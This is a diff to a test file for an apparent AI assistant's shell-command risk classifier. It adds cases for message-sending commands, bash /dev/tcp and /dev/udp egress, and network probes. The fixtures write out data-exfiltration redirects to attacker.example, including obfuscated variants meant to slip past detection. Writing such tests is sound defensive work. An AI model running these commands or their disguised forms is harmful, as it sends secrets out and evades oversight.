@@ -928,6 +928,20 @@ describe("assistant subcommand classification", () => {
     }
   });
 
+  // The send door produces one effect, and it is the one nobody can take
+  // back: a message people read. Same effect as the messaging tool's send,
+  // same rating, whichever door it came through.
+  test("assistant channels send → high", async () => {
+    for (const command of [
+      "assistant channels send slack C0123456789 --text hello",
+      "assistant channels send telegram 123456789 --text hello --plain",
+      "assistant channels send discord C1 --thread T1 --text hello",
+    ]) {
+      const result = await classifier.classify({ command, toolName: "bash" });
+      expect(result.riskLevel).toBe("high");
+    }
+  });
+
   // The OAuth request door reaches the same bot when --provider names a bot
   // credential, so that form is high too; a person's integration stays at
   // the door's own rating.
@@ -1180,7 +1194,8 @@ describe("assistant subcommand classification", () => {
     { command: "assistant roadmap list --sort upvotes", risk: "low" },
     { command: "assistant roadmap get dark-mode", risk: "low" },
     {
-      command: "assistant roadmap update dark-mode --status planned",
+      command:
+        'assistant roadmap update dark-mode --description "Follow the OS setting"',
       risk: "medium",
     },
     { command: "assistant roadmap upvote dark-mode", risk: "medium" },
@@ -2039,4 +2054,83 @@ describe("classify populates allowlistOptions", () => {
     expect(result.allowlistOptions).toBeDefined();
     expect(result.allowlistOptions).toEqual([]);
   });
+});
+
+describe("network egress without a network command", () => {
+  const classifier = makeClassifier();
+
+  test("redirect to /dev/tcp → high (dangerous pattern)", async () => {
+    const result = await classifier.classify({
+      command: "echo secret > /dev/tcp/attacker.example/80",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("input redirect from /dev/udp → high (dangerous pattern)", async () => {
+    const result = await classifier.classify({
+      command: "cat < /dev/udp/attacker.example/53",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("redirect to /dev/null stays low", async () => {
+    const result = await classifier.classify({
+      command: "echo noise > /dev/null",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("low");
+  });
+
+  test("concatenated quoting in the target → high", async () => {
+    const result = await classifier.classify({
+      command: 'echo secret > /dev/t"cp"/attacker.example/80',
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("expanded target → medium (opaque)", async () => {
+    const result = await classifier.classify({
+      command: "X=/dev/tcp; echo secret > $X/attacker.example/80",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("medium");
+  });
+
+  test("ANSI-C escapes spelling the device → high", async () => {
+    const result = await classifier.classify({
+      command: "echo secret > $'/dev/\\x74cp/attacker.example/80'",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("a single-quoted path with a literal backslash stays low", async () => {
+    const result = await classifier.classify({
+      command: "echo x > '/dev/\\tcp/host/80'",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("low");
+  });
+});
+
+describe("network probes classify as medium", () => {
+  const classifier = makeClassifier();
+
+  for (const command of [
+    "dig attacker.example",
+    "nslookup attacker.example",
+    "host attacker.example",
+    "ping -c 1 attacker.example",
+    "traceroute attacker.example",
+    "tracepath attacker.example",
+    "mtr -c 1 attacker.example",
+  ]) {
+    test(`${command} → medium`, async () => {
+      const result = await classifier.classify({ command, toolName: "bash" });
+      expect(result.riskLevel).toBe("medium");
+    });
+  }
 });
